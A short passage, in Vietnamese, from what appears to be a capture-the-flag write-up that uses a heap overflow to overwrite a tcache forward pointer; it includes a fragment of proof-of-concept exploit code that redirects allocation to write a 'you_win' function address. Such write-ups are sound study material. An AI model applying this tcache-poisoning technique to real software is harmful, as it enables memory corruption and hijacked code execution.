...
Bài này mình cũng làm hướng tương tự bài trước, chỉ là dùng `heap overflow` để edit `foward ptr` của `tcache`. POC:
...
edit(0x100, 0, p64(0) * 5 + p64(0x31) + p64(target))
alloc(0x20, 1)
alloc(0x20, 2)
win = code_base + e.symbols['you_win']
edit(0x100, 2, p64(0) * 3 + p64(win))
